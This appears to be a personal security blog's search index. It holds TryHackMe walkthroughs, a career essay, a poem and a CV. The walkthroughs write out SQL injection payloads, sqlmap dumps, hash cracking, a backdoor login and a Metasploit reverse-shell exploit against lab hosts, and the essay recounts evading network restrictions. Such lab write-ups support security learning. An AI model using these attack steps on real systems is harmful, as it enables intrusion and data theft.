\u0026#34;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3\u0026#34; as we proceed further, there\u0026rsquo;s a function called verifyPass:\nfunc verifyPass(hash, salt, password string) towards the bottom of the program, we see that a hardcoded salt is passed to the function:\nfunc passwordHandler(_ ssh.Context, password string) bool { return verifyPass(hash, \u0026#34;1c362db832f3f864c8c2fe05f2002a05\u0026#34;, password) do you remember the hash the attacker used to login to the backdoor? that hash had this salt hardcoded onto it. identifying the attacker\u0026rsquo;s hash as SHA512($pass.$salt), we can now try crack it. this time, i used hashcat:\nhashcat.exe -a 0 -m 1710 \u0026#34;6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05\u0026#34; C:\\rockyou.txt --force the password we get after the hash is cracked is \u0026ldquo;november16\u0026rdquo;.\nlet\u0026rsquo;s now login to the attacker\u0026rsquo;s backdoor. our target IP is 10.10.12.175, and the backdoor was running on port 2222:\nssh -p 2222 james@10.10.12.175 we are logged in as james, into the backdoor, and we can access the user.txt flag.\nwhile we\u0026rsquo;re here, let\u0026rsquo;s run ls -la and see what we get.\nwe can see a root process called .suid_bash. a quick google search shows that this little exploit opens a bash shell as root, meaning although an attacker may not be root, running the process will give them the effective privileges of root.\nso let\u0026rsquo;s run this process by typing ./.suid_bash -p and get the root flag.\nuploading a php reverse shell via an upload form is a very simple and preventable attack vector. it can give an attacker direct access to the target. in this case, a backdoor was also set up, which should be prevented at all costs. a quick fix would have been to set up multiple firewalls (using iptables, ufw, or whichever linux firewall they choose) and having an implicit deny for all traffic other than what is specifically allowed.\na proxy with deep packet inspection capabilities, and which intercepts SSL/TLS connections and blocks any suspicious outbound traffic would also have helped. a simpler solution is to disable the ability for executables to run from temp directories.\nfinally, if your company wants to spend the time in understanding and implementing software restriction policies, which only allow known executables to run, that is the best solution.\n","date":"2021-10-27","permalink":"//localhost:1313/posts/overpass2/","section":"","summary":"","tags":["","","","",""],"title":"tryhackme: overpass2"},{"categories":[],"contents":"this is a walkthrough for the room \u0026ldquo;game zone\u0026rdquo; on tryhackme. this was the 4th room in the \u0026ldquo;advanced exploitation\u0026rdquo; chapter, part of the \u0026ldquo;offensive pentesting\u0026rdquo; path.\ni liked this room because i like sql (yes, i know). database security is a very important component of cybersecurity, as databases are used in almost every type of modern organization. at the end of the walkthrough, i\u0026rsquo;ll also include a link to a resource about preventing database attacks.\ntun0 IP address: 10.9.6.194 target IP address: 10.10.141.141\nthe first thing i always do, is to get an nmap scan going on the target. while that\u0026rsquo;s running, i try to visit the IP address, in case it\u0026rsquo;s a web page.\nthe nmap scan:\nnmap -sV -Pn 10.10.141.141 -v -T4 i want a very quick, one shot enumeration of the open ports and what services they are running.\nkeep in mind that i\u0026rsquo;m not doing a UDP scan on this network. from my experience, they usually don\u0026rsquo;t bring any more information. rarely, you might discover and have to use some open UDP ports.\nvisiting the IP address takes us to a website.\nthe first question of the room is:\nWhat is the name of the large cartoon avatar holding a sniper on the forum?\ni just happen to know the name of this character. if you don\u0026rsquo;t, you can download the image and do a reverse image search. the search will lead you to the name of the video game: hitman. if you google hitman, you\u0026rsquo;ll know the name of the protagonist (the dude in the photo) is Agent 47.\nlet\u0026rsquo;s check back on our nmap scan.\nwe have 2 open ports, according to this scan: port 22 (SSH) and port 80 (HTTP). port 80 is obviously the website. let\u0026rsquo;s dig around on the website a bit more.\nas we can see on the landing page, there\u0026rsquo;s a login form. we have 2 options here: either try to use SQL injection (sqli), or try to brute force the login form if sqli is not possible.\na login SQL query usually looks something like:\nSELECT * FROM users WHERE username = \u0026#34;user\u0026#34; AND password = \u0026#34;pass\u0026#34; what this query tries to do, is select the database table \u0026ldquo;users\u0026rdquo; and login with the credentials user:pass.\nSQLi can be used to break the query. this is usually done by using a string termination character (\u0026rsquo;) along with a true boolean statement:\n\u0026#39; OR 1=1 -- - it\u0026rsquo;s usually some variation of the above. the dashes at the end indicate the start of a comment, which in this case would comment out the rest of the query.\nfor example, if you entered \u0026ldquo;admin\u0026rdquo; as the username, and \u0026ldquo;\u0026rsquo; OR 1=1 \u0026ndash; -\u0026rdquo; as the password, our query would become:\nSELECT * FROM users where username = admin AND password = \u0026#39; OR 1=1 -- - in a weak system that didn\u0026rsquo;t sanitize user input, this would break the login query and log us in as admin, because the password is always true. let\u0026rsquo;s try to login, but let\u0026rsquo;s set the username as \u0026ldquo;\u0026rsquo; OR 1=1 \u0026ndash; -\u0026rdquo;\nit worked! the site took us to a page called \u0026ldquo;portal.php\u0026rdquo;.\nit seems to be a form where you can search for a game review. hitting search with no game in the field shows us a list of the game reviews on the database.\nlet\u0026rsquo;s try to search for a game and intercept the request in burp suite. we\u0026rsquo;ll save the request as a text file, then feed it to sqlmap (an automated SQLi attack tool).\nthe intercepted request:\ni saved the request as burp.txt.\nin sqlmap, we can use the command:\nsqlmap -r burp.txt --dbms=mysql --dump what this will do is dump the contents of the entire database. this can be a very noisy operation, so i\u0026rsquo;d advise against it. the more stealthy approach is to dump the info in little parts, starting with the databases, then the tables inside the databases, and finally the contents of the tables.\nsqlmap -r burp.txt --dbms=mysql --dbs we can see 5 databases. \u0026ldquo;information_schema\u0026rdquo; and \u0026ldquo;performance_schema\u0026rdquo; are usually default generated databases, so let\u0026rsquo;s focus on the database \u0026ldquo;db\u0026rdquo;.\nsqlmap -r burp.txt --dbms=mysql -D db --tables there are 2 tables: post and users. obviously, you want to dump the contents of the user table to see if there are any hashes or plaintext passwords (rare) stored.\nsqlmap -r burp.txt --dbms=mysql -D db -T users --dump there\u0026rsquo;s a user (agent47), along with their password hash (ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14).\nwhat can we do with this hash? well, we can crack it! to crack it, you can either use john the ripper or hashcat. for this example, let\u0026rsquo;s use john. before we do that though, we need to identify the hash. there are a variety of ways to identify hashes. you can either use an online hash identifier, like the one on hashes.com , or you can tell from experience if you\u0026rsquo;ve been exposed to hashes in the past. i just happen to know that this is a SHA256 hash, so let\u0026rsquo;s work on cracking it with john. first, save the hash to a file.\njohn agent47.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 since i\u0026rsquo;ve already performed this crack, the result has been cached and pops up right away for me. normally, you will have to wait a while as john proceeds through the wordlists provided. hashcat might be a better option in some cases, as it can harness your GPU\u0026rsquo;s CUDA cores and crack the hashes a lot faster.\nso we now have the credentials agent47:videogamer124. what can we do with this information? if you remember the nmap scan at the beginning, there was an SSH service running on port 22. let\u0026rsquo;s attempt to SSH into agent47\u0026rsquo;s machine.\nssh agent47@10.10.141.141 we got our first flag! sweet. so, what now? in most cases, an attacker won\u0026rsquo;t simply stop here. the primary goal of an attacker is to gain root/admin access.\nin the case of web applications like game zone, some services may be hidden behind firewalls. in some networks too, some websites may be blocked. what we can do in that case, is to create a reverse SSH tunnel that forwards the blocked traffic to a server that we own, then view it. -L is a local tunnel (YOU \u0026lt;- CLIENT).\nfirst, we have to see the sockets that are running on a host. from inside the SSH terminal:\nss -tulpn -t displays TCP sockets, -u displays UDP sockets, -l displays listening sockets, -p displays the process using the socket, -n makes sure the hostnames aren\u0026rsquo;t resolved.\nwe can see that there\u0026rsquo;s a service running on port 10000. the service is hidden, meaning it\u0026rsquo;s probably behind a firewall rule. since we\u0026rsquo;re not root, we can\u0026rsquo;t modify the iptables list. let\u0026rsquo;s create a reverse SSH tunnel and make the service visible to us. on our local machine, run:\nssh -L 10000:localhost:10000 agent47@10.10.141.141 if you visit localhost:10000 in a browser, you\u0026rsquo;ll now see the webmin login page that was previously hidden.\ntry logging in with agent47:videogamer124.\nit works! and we can see some system information about the service.\nthe most important thing here is the webmin version: 1.580. we can use this information to search for an exploit relating to this exact version. i like to use searchsploit, because we\u0026rsquo;re going to use metasploit, but you can use google or any other exploit database to find it.\nwe\u0026rsquo;re going to use the first result: /file/show.cgi Remote Command Execution. this exploits an arbitrary command execution vulnerability in our version of webmin. the vulnerability exists in /file/show.cgi and will allow an authenticated user (agent47) to execute arbitrary commands with root privileges.\nfire up msfconsole, and search for this exploit.\nnow, let\u0026rsquo;s configure our exploit.\nset payload cmd/unix/reverse set PASSWORD videogamer124 set USERNAME agent47 set RHOSTS localhost set SSL false set LHOST 10.9.6.194 set LPORT 4444 run if the exploit is successful, we\u0026rsquo;ll get a shell. remember, the reverse ssh tunnel needs to be running for this exploit to work. when you get the shell, upgrade to a proper shell by typing shell. we\u0026rsquo;ll be in the /usr/share/webmin/file directory, and the root flag is stored at /root/root.txt.\nso there it is. we used SQLi to get initial, low privilege access to the network. after some poking around and reverse SSH tunneling, we discovered a CMS called webmin, that had a pretty neat little exploit specific to its version.\nhow can we prevent SQLi and the host of issues it can open up a private network to?\ninput validation parametrized queries stored procedures escaping avoiding administrative privileges web application firewalls (WAF) this article from ptsecurity breaks down the above prevention methods quite well, and everyone working with databases that contain loads of secure data would be well advised to follow them!\n","date":"2021-10-26","permalink":"//localhost:1313/posts/gz_walkthrough/","section":"","summary":"","tags":["","","","",""],"title":"tryhackme: game zone"},{"categories":[],"contents":"over the past year, i felt something i haven\u0026rsquo;t felt in a long time. passion, for a new hobby and possibly a new field of work: cybersecurity. more specifically, pen(etration)testing.\nthe story is pretty boring. as a kid, i was fascinated by computers. then, like so many young wannabe hackers, i watched \u0026ldquo;the matrix\u0026rdquo; and i became even more fascinated. not so much by computers, but rather how to get into computers and networks i\u0026rsquo;m not supposed to.\nbefore i grew up in the uae. the emirate of sharjah, to be precise. my mother was a professor in the university, and as such we had to live in the faculty housing on campus. the campus was connected as an intranet (a really big private network), so the already restricted internet access of the uae was restricted even further. this meant that i had no access to torrenting applications, online gaming, and, of course, other\u0026hellip;sites that i wanted to visit very much but was simply not allowed to. friends of mine, who weren\u0026rsquo;t in the intranet, had access to torrenting apps and online gaming, so it was just another thing i seemed to be left out of. for a long time, we hung out in internet/gaming cafes, gaming for hours and downloading whatever we wanted. my biggest weaknesses at the time, and even now, were music and movies. streaming didn\u0026rsquo;t exist at the time so my options were either a) get it all at a cafe, using blazingly-fast (at the time) DSL or b) have a friend burn me CDs/DVDs with all the stuff i wanted. far from ideal.\nover time, a proxy server and early vpn known as hotspotshield became popular for, y\u0026rsquo;know, stuff, and everyone seemed to be using it. i tried to use it to torrent but in our intranet, it was either throttled to be unusable and eventually blacklisted. so what did i end up doing? why, learning linux of course!\nsomeday, i\u0026rsquo;ll have to find and thank the person who got me interested in such things. he was, and probably still is, a massive geek with an almost unbelievable memory and penchant for all things computer-related. he taught me how to use linux (ubuntu) and connect via ssh to a host he\u0026rsquo;d set up somewhere (don\u0026rsquo;t know how) outside the country. this was my first experience with virtualization, ssh, and properly configured vpns that would maintain my anonymity (i thought) and provide a usable connection speed that could also be used for gaming and torrenting. i was elated. suddenly, i had broken out of the restrictions that i had halfway accepted and the entire internet was at my fingertips. emphasis on entire.\neventually, the remote host died for good and i lost access to the proxy. bummer. by that point, i had figured out (with the help of another student at my school who also happened to be my neighbour), how to enumerate and access smb shares on the intranet. as you may know, university campuses almost always had some version of a massive file sharing app like dc++ running, where students could freely share movies and music. dc++ didn\u0026rsquo;t exactly work for us, maybe because we weren\u0026rsquo;t connected to the student network, but somehow we could view some public smb shares where some students had set up their shared folders. once we had that, it was almost better than torrenting. of course, the music was never up to my standards but there was always a metalhead somewhere in the mix from whom i\u0026rsquo;d copy (steal) music.\ni ended up leaving the country to study in canada and my access widened, so my early foray into hacking went limp and then died. i majored in electrical engineering, so the hacking was mostly physical. i learned a lot about assembly and memory, on a physical but still somewhat abstract level. learning electronics was also fun, but i didn\u0026rsquo;t really care for it. however, i finished my degree and ended up getting a job as a software and database developer.\ncoding was never something i was super into, beyond an aesthetic appreciation. it was kinda cool, and that was about it. it was also the career of choice for many engineers who couldn\u0026rsquo;t stand their original discipline and just wanted a job. i was one of them, and here i was.\nnow when the pandemic hit, i felt boredom on a metaphysical level. i\u0026rsquo;m the kind of person who already gets easily bored, so being made to stay at home and do something i only halfway enjoyed was not it. i wanted to do something different, something exciting. but what?\nit just so happened that my interest in infosec/cybersec never truly died, that i happened to follow many infosec professionals and pentesters on twitter. i hardly ever knew what they were talking about, but i liked it. in the past year, it hit me. if i like it so much, what\u0026rsquo;s stopping me from actually doing it? not much, in fact. and so i started looking more closely. and learning.\ni quickly identified pentesting as my dream field. i started to consume vast amounts of information on the field: what they do, their certifications, their techniques. i joined online communities like tryhackme, and even signed up for a junior pentesting cert from elearnsecurity. now, i have both the eJPT cert as well as a bunch of completed rooms on tryhackme to my name. it may not be much, but i was hooked.\nin the past year, i\u0026rsquo;ve learned more and more about linux, windows, networking, databases (beyond the scope of my job), shell scripting, web hacking, enumeration, footprinting, scanning, vulnerabilities. i\u0026rsquo;ve learned and practiced a variety of attacks: bruteforce/dictionary attacks using hydra, xss, sql injections, arp poisoning, file inclusions, remote code executions (reverse shells), privilege escalation, and finally, active directory. what\u0026rsquo;s missing here? the other side! and so i started to learn about defense: firewalls, SIEMs, IPS/IDS, hardening\u0026hellip;and there\u0026rsquo;s still so much to learn.\nthen i learned that when you truly enjoy something, you don\u0026rsquo;t get tired of it. rather, you can\u0026rsquo;t get tired of it. i want to keep going, and keep learning, and keep getting better. i hope to get a job in the field where i can learn from true professionals and real systems. i\u0026rsquo;m also going to use this site to dump whatever i\u0026rsquo;ve learned, whatever room i\u0026rsquo;ve solved, and pretty much anything else i feel like.\nto whoever\u0026rsquo;s reading this: thank you. and i hope that whatever you find yourself naturally gravitating towards, you accept it and lean into it and turn it into a passion.\n","date":"2021-10-24","permalink":"//localhost:1313/posts/cybersec/intro/","section":"","summary":"","tags":[""],"title":"intro to hacking"},{"categories":[],"contents":"cracks in the asphalt, cracks in the curb\ncracks in the sidewalk, cracks in the doors\ncracks in the walls and cracks in the floor\ncracks in the glass, cracks in the steel\ncracks in the marble and cracks in the pillars\ncrack my eyes open to see a little more\ncracks in my hands, cracks in my feet\ncracks in my smile, cracks in my face\ncracks in my youth and cracks in my world\ncracks in the earth, cracks in the ways\ncracks in the stairs, between me and You\ni move inwards, towards the cracks in my psyche\nhoping to trip and hold on to You\nbut i don\u0026rsquo;t\ni slip through the cracks\n","date":"2021-02-15","permalink":"//localhost:1313/posts/cracks/","section":"","summary":"","tags":[],"title":"cracks"},{"categories":[],"contents":"tl;dr all things security: OffSec, InfraSec, AppSec/ProdSec, CloudSec, etc. i\u0026rsquo;m also into reverse engineering, malware analysis/development, AI-boosted pentesting, and pretty much all kinds of tech mischief i can integrate into my professional career.\nexperience nov 2024 - present staff security engineer @ Turo head engineer for infrastructure security, detection + response, application security.\njul 2024 - nov 2024 senior security engineer @ Numerator focal point between SecOps, DevOps, IT, Platform, and Data teams.\nscouring and securing engineering architecture and infrastructure: cross-stack vulnerability management (discovery, triage, reporting, remediation, tracking), identity + access management, API security, Terraform guardrails, container + cluster security, incident response.\ndec 2021 - dec 2023 software security engineer + researcher @ Trustwave SpiderLabs investigated attacks and vulnerabilities for key clients in telecommunications, energy, and national security.\nlots of deep research and red teaming (offensive security), specifically around database security, to build up threat intelligence.\nbuilt sensors based on collected intelligence (attacker + malware behaviour, OSINT, dark net markets, shadow channels, c) to keep clients up-to-date and protected.\njun 2018 - dec 2021 lead database developer @ Veryon entry-level software + database development.\ndata warehousing, ETL, automations, etc.\neducation bachelor of engineering @ Western U majored in electrical and computer engineering, with a specialization in information theory and wireless transmission. aduated in 2018.\nlanguages english: native\nhindi: native\nurdu: native\nfrench: intermediate\narabic: intermediate\nmandarin: rudimentary\ninterests homelab\nphilosophy\nreading\nphotography\ndancing\nbasketball\ntech + skills frontend React • Angular • Vue.js • JavaScript • TypeScript\nbackend Java • Python • C/C++/C# • Node.js • Ruby • Go • Ruby on Rails • .NET • Express.js • Flask • Django • Spring ot • RESTful + GraphQL APIs • Docker • Kubernetes • gRPC\ndatabases PostgreSQL • MySQL • MS SQL Server Oracle • MongoDB • Cassandra • Redis • Elasticsearch • Snowflake\ndevops + infra AWS • Azure • Jenkins • GitLab CI • GitHub Actions • Docker • Kubernetes • OpenShift • Ansible • Terraform • Puppet • Chef\nAI/ML + data TensorFlow • PyTorch • Pandas • NumPy • Matplotlib • Tableau • Deep Learning (RNN/CNN) • ETL\ninsights Prometheus • Grafana • Datadog • ELK • Splunk • Git • Jira • Confluence\npenetration testing Metasploit • Burp Suite • nmap • Nessus • ZAP\nnetwork security ASA/Palo Alto • Snort/Suricata• VPN • NAC • SSL/TLS • TCP/IP/UDP • SSH\napplication security Snyk • Semgrep • Socket • Burp Suite • OWASP Top 10 • CIS Controls • ST SP 800-53 • Vanta • GitHub Advanced Security (CodeQL) • JupiterOne\nIAM + cryptography Okta • Auth0 • AD • AWS IAM • OAuth2.0 • OIDC • SAML • AES • RSA • ECC • SHA-256 • MD5 • OpenSSL\nreverse engineering IDA Pro • Ghidra • Immunity Debugger • Decompilation • GDB • WinDBG • x64dbg • gdbExtract\n","date":"0001-01-01","permalink":"//localhost:1313/cv/","section":"","summary":"","tags":[],"title":""}]